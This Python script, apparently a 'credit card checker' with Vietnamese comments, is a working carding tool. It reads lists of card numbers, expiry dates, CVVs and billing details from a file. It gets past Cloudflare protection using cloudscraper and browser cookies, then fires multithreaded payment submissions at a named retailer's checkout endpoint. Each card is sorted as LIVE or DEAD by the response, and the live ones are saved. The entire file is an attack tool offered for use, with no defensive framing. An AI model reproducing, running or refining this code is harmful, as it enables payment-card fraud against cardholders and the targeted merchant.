#!/usr/bin/env python3
"""
Credit Card Checker Tool V2
Sử dụng cloudscraper để bypass Cloudflare
"""

import time
import json
import argparse
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Tuple
import urllib.parse

try:
    import cloudscraper
except ImportError:
    print("[!] Cần cài đặt cloudscraper: pip install cloudscraper")
    print("[!] Hoặc dùng: pip install cloudscraper[ssl]")
    exit(1)


class CardChecker:
    def __init__(self, threads: int = 5, timeout: int = 30):
        """
        Khởi tạo CardChecker với cloudscraper
        
        Args:
            threads: Số luồng chạy song song
            timeout: Timeout cho mỗi request (giây)
        """
        self.threads = threads
        self.timeout = timeout
        
        # Sử dụng cloudscraper thay vì requests
        self.scraper = cloudscraper.create_scraper(
            browser={
                'browser': 'chrome',
                'platform': 'darwin',
                'desktop': True
            }
        )
        
        # Headers cố định
        self.headers = {
            'accept': '*/*',
            'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.pipesandcigars.com',
            'referer': 'https://www.pipesandcigars.com/checkout',
            'x-requested-with': 'XMLHttpRequest'
        }
        
        self.url = 'https://www.pipesandcigars.com/on/demandware.store/Sites-PC-Site/default/CheckoutServices-SubmitPayment'
        
        # CSRF token - CẦN UPDATE từ browser
        self.csrf_token = 'UPDATE_THIS_TOKEN'
        
    def update_cookies_from_curl(self, cookie_string: str):
        """
        Update cookies từ curl command
        
        Args:
            cookie_string: Cookie string từ curl -b parameter
        """
        cookies = {}
        for item in cookie_string.split('; '):
            if '=' in item:
                key, value = item.split('=', 1)
                cookies[key] = value
        
        for key, value in cookies.items():
            self.scraper.cookies.set(key, value)
        
        print(f"[*] Đã update {len(cookies)} cookies")
        
    def parse_card(self, card_line: str) -> Dict[str, str]:
        """
        Parse thông tin thẻ từ string
        Format hỗ trợ:
        - card_number|exp_month|exp_year|cvv
        - card_number|exp_month/exp_year|cvv
        - card_number|exp_month/exp_year|cvv|name|address|city|state|zip|country|phone
        
        Args:
            card_line: Dòng chứa thông tin thẻ
            
        Returns:
            Dict chứa thông tin thẻ
        """
        card_line = card_line.strip()
        if not card_line or card_line.startswith('#'):
            return None
            
        parts = card_line.split('|')
        if len(parts) < 3:
            return None
            
        card_number = parts[0].strip().replace(' ', '')
        
        # Parse exp date
        if '/' in parts[1]:
            exp_parts = parts[1].split('/')
            exp_month = exp_parts[0].strip()
            exp_year = exp_parts[1].strip()
            cvv = parts[2].strip() if len(parts) > 2 else ''
        else:
            exp_month = parts[1].strip()
            exp_year = parts[2].strip() if len(parts) > 2 else ''
            cvv = parts[3].strip() if len(parts) > 3 else ''
        
        # Đảm bảo exp_year có 4 chữ số
        if len(exp_year) == 2:
            exp_year = '20' + exp_year
            
        # Xác định loại thẻ
        if card_number.startswith('4'):
            card_type = 'Visa'
        elif card_number.startswith('5'):
            card_type = 'Master Card'
        elif card_number.startswith('3'):
            card_type = 'American Express'
        else:
            card_type = 'Unknown'
        
        # Parse thông tin bổ sung nếu có
        billing_info = {}
        if len(parts) >= 11:
            billing_info = {
                'name': parts[4].strip(),
                'address': parts[5].strip(),
                'city': parts[6].strip(),
                'state': parts[7].strip(),
                'zip': parts[8].strip(),
                'country': parts[9].strip(),
                'phone': parts[10].strip()
            }
            
        return {
            'number': card_number,
            'exp_month': exp_month,
            'exp_year': exp_year,
            'cvv': cvv,
            'type': card_type,
            'billing': billing_info
        }
    
    def build_payload(self, card: Dict[str, str]) -> str:
        """
        Tạo payload cho request
        
        Args:
            card: Dict chứa thông tin thẻ
            
        Returns:
            Payload string
        """
        # Sử dụng billing info nếu có, không thì dùng default
        billing = card.get('billing', {})
        
        data = {
            'dwfrm_billing_addressFields_typeID': 'useShippingAddress',
            'dwfrm_billing_addressFields_addressNickname': billing.get('name', 'Michael'),
            'dwfrm_billing_addressFields_firstName': billing.get('name', 'Michael').split()[0] if billing.get('name') else 'Michael',
            'dwfrm_billing_addressFields_lastName': billing.get('name', 'Johnson').split()[-1] if billing.get('name') else 'Johnson',
            'dwfrm_billing_addressFields_companyName': '',
            'dwfrm_billing_addressFields_address1': billing.get('address', '350 5th Ave'),
            'dwfrm_billing_addressFields_address2': '',
            'dwfrm_billing_addressFields_city': billing.get('city', 'New York'),
            'dwfrm_billing_addressFields_country': billing.get('country', 'US'),
            'dwfrm_billing_addressFields_states_stateCode': billing.get('state', 'NY'),
            'dwfrm_billing_addressFields_isBilling': 'true',
            'dwfrm_billing_addressFields_postalCode': billing.get('zip', '10118-0100'),
            'dwfrm_billing_contactInfoFields_phone': billing.get('phone', '2175551234'),
            'dwfrm_billing_addressFields_phoneNumberExtension': '',
            'dwfrm_billing_addressFields_residentialOrBusiness': 'Residential',
            'csrf_token': self.csrf_token,
            'localizedNewAddressTitle': 'new',
            'dwfrm_billing_paymentMethod': 'CREDIT_CARD',
            'dwfrm_billing_creditCardFields_cardType': card['type'],
            'dwfrm_billing_creditCardFields_cardNumber': card['number'],
            'dwfrm_billing_creditCardFields_expirationMonth': card['exp_month'],
            'dwfrm_billing_creditCardFields_expirationYear': card['exp_year'],
            'dwfrm_billing_creditCardFields_securityCode': card['cvv'],
        }
        
        return urllib.parse.urlencode(data)
    
    def check_card(self, card: Dict[str, str], verbose: bool = False) -> Tuple[str, str, str]:
        """
        Kiểm tra một thẻ
        
        Args:
            card: Dict chứa thông tin thẻ
            verbose: Hiển thị debug info
            
        Returns:
            Tuple (card_info, status, message)
        """
        card_info = f"{card['number']}|{card['exp_month']}/{card['exp_year']}|{card['cvv']}"
        
        try:
            payload = self.build_payload(card)
            
            response = self.scraper.post(
                self.url,
                headers=self.headers,
                data=payload,
                timeout=self.timeout
            )
            
            status_code = response.status_code
            
            if verbose:
                print(f"\n[DEBUG] Status Code: {status_code}")
                print(f"[DEBUG] Response Body (first 500 chars): {response.text[:500]}\n")
            
            if status_code == 200:
                try:
                    json_response = response.json()
                    
                    # Check các trường hợp khác nhau
                    if json_response.get('success') == True:
                        return (card_info, 'LIVE', 'Card is valid ✓')
                    elif 'error' in json_response:
                        error_msg = json_response.get('error', '')
                        if 'declined' in error_msg.lower() or 'invalid' in error_msg.lower():
                            return (card_info, 'DEAD', f'Card declined: {error_msg}')
                        else:
                            return (card_info, 'UNKNOWN', f'Error: {error_msg}')
                    elif 'errorMessage' in json_response:
                        error_msg = json_response.get('errorMessage', '')
                        return (card_info, 'DEAD', f'Error: {error_msg}')
                    else:
                        # Kiểm tra response text
                        response_text = response.text.lower()
                        if 'success' in response_text or 'approved' in response_text:
                            return (card_info, 'LIVE', 'Card approved ✓')
                        elif 'declined' in response_text or 'invalid' in response_text:
                            return (card_info, 'DEAD', 'Card declined')
                        else:
                            return (card_info, 'UNKNOWN', f'Unknown response: {response.text[:100]}')
                            
                except json.JSONDecodeError:
                    response_text = response.text.lower()
                    if 'success' in response_text or 'approved' in response_text:
                        return (card_info, 'LIVE', 'Card approved ✓')
                    elif 'declined' in response_text or 'invalid' in response_text:
                        return (card_info, 'DEAD', 'Card declined')
                    else:
                        return (card_info, 'UNKNOWN', f'Cannot parse response: {response.text[:100]}')
            elif status_code == 403:
                return (card_info, 'ERROR', 'Cloudflare blocked - Update cookies!')
            else:
                return (card_info, 'ERROR', f'HTTP {status_code}')
                
        except Exception as e:
            return (card_info, 'ERROR', f'Error: {str(e)}')
    
    def check_cards_from_file(self, input_file: str, output_file: str = None, verbose: bool = False):
        """
        Check danh sách thẻ từ file
        
        Args:
            input_file: File chứa danh sách thẻ
            output_file: File để lưu kết quả (optional)
            verbose: Hiển thị debug info
        """
        print(f"[*] Đọc file: {input_file}")
        
        # Đọc danh sách thẻ
        cards = []
        with open(input_file, 'r') as f:
            for line in f:
                card = self.parse_card(line)
                if card:
                    cards.append(card)
        
        total = len(cards)
        print(f"[*] Tổng số thẻ: {total}")
        print(f"[*] Số luồng: {self.threads}")
        print(f"[*] Bắt đầu check...\n")
        
        # Kết quả
        results = {
            'live': [],
            'dead': [],
            'unknown': [],
            'error': []
        }
        
        checked = 0
        start_time = time.time()
        
        # Check song song
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(self.check_card, card, verbose): card for card in cards}
            
            for future in as_completed(futures):
                card_info, status, message = future.result()
                checked += 1
                
                # Hiển thị kết quả
                if status == 'LIVE':
                    print(f"[✓] LIVE: {card_info} - {message}")
                    results['live'].append({'card': card_info, 'message': message})
                elif status == 'DEAD':
                    print(f"[✗] DEAD: {card_info} - {message}")
                    results['dead'].append({'card': card_info, 'message': message})
                elif status == 'UNKNOWN':
                    print(f"[?] UNKNOWN: {card_info} - {message}")
                    results['unknown'].append({'card': card_info, 'message': message})
                else:
                    print(f"[!] ERROR: {card_info} - {message}")
                    results['error'].append({'card': card_info, 'message': message})
                
                # Hiển thị tiến độ
                elapsed = time.time() - start_time
                rate = checked / elapsed if elapsed > 0 else 0
                print(f"    Progress: {checked}/{total} ({checked*100//total}%) - Rate: {rate:.2f} cards/s\n")
        
        # Tổng kết
        print("\n" + "="*60)
        print("KẾT QUẢ TỔNG HỢP")
        print("="*60)
        print(f"Tổng số thẻ: {total}")
        print(f"✓ LIVE: {len(results['live'])}")
        print(f"✗ DEAD: {len(results['dead'])}")
        print(f"? UNKNOWN: {len(results['unknown'])}")
        print(f"! ERROR: {len(results['error'])}")
        print(f"Thời gian: {time.time() - start_time:.2f}s")
        print("="*60)
        
        # Lưu kết quả
        if output_file:
            self.save_results(results, output_file)
            print(f"\n[*] Kết quả đã được lưu vào: {output_file}")
        
        return results
    
    def save_results(self, results: Dict, output_file: str):
        """
        Lưu kết quả vào file
        
        Args:
            results: Dict chứa kết quả
            output_file: File để lưu
        """
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        with open(output_file, 'w') as f:
            f.write(f"# Card Checker Results - {timestamp}\n")
            f.write(f"# Total: {sum(len(v) for v in results.values())}\n\n")
            
            f.write(f"# ✓ LIVE CARDS ({len(results['live'])})\n")
            for item in results['live']:
                f.write(f"{item['card']} | {item['message']}\n")
            
            f.write(f"\n# ✗ DEAD CARDS ({len(results['dead'])})\n")
            for item in results['dead']:
                f.write(f"{item['card']} | {item['message']}\n")
            
            f.write(f"\n# ? UNKNOWN ({len(results['unknown'])})\n")
            for item in results['unknown']:
                f.write(f"{item['card']} | {item['message']}\n")
            
            f.write(f"\n# ! ERRORS ({len(results['error'])})\n")
            for item in results['error']:
                f.write(f"{item['card']} | {item['message']}\n")


def main():
    parser = argparse.ArgumentParser(
        description='Credit Card Checker Tool V2 (with Cloudflare bypass)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python card_checker_v2.py -i cards.txt
  python card_checker_v2.py -i cards.txt -o results.txt -t 10
  python card_checker_v2.py -i cards.txt --cookies "cookie_string" --csrf "token"
        """
    )
    
    parser.add_argument('-i', '--input', required=True, help='File chứa danh sách thẻ')
    parser.add_argument('-o', '--output', help='File để lưu kết quả')
    parser.add_argument('-t', '--threads', type=int, default=5, help='Số luồng (default: 5)')
    parser.add_argument('--timeout', type=int, default=30, help='Timeout cho mỗi request (default: 30s)')
    parser.add_argument('--cookies', help='Cookie string từ browser')
    parser.add_argument('--csrf', help='CSRF token từ browser')
    parser.add_argument('-v', '--verbose', action='store_true', help='Hiển thị debug info')
    
    args = parser.parse_args()
    
    checker = CardChecker(threads=args.threads, timeout=args.timeout)
    
    # Update cookies nếu có
    if args.cookies:
        checker.update_cookies_from_curl(args.cookies)
    
    # Update CSRF token nếu có
    if args.csrf:
        checker.csrf_token = args.csrf
        print(f"[*] Đã update CSRF token")
    
    checker.check_cards_from_file(args.input, args.output, args.verbose)


if __name__ == '__main__':
    main()
